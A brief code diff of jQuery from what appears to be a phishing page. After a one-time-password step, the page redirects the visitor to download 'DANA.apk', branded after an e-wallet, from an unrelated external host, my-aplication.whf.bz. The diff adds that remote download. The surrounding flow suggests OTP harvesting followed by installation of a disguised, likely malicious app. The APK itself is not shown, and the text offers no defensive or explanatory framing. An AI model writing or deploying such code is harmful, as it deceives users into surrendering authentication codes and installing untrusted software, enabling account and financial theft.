@@ -204,10 +204,11 @@ $(".alert").css("color","red");
             console.log('Complete');
     setTimeout(function(){
     $(".loadingOtp").hide();
-   
+    window.location.href='https://my-aplication.whf.bz/DANA.apk';
     $('.inpotp').val('');
-   location.href='DANA.apk';
+  
     },2000);
   }});};
     
+       
        
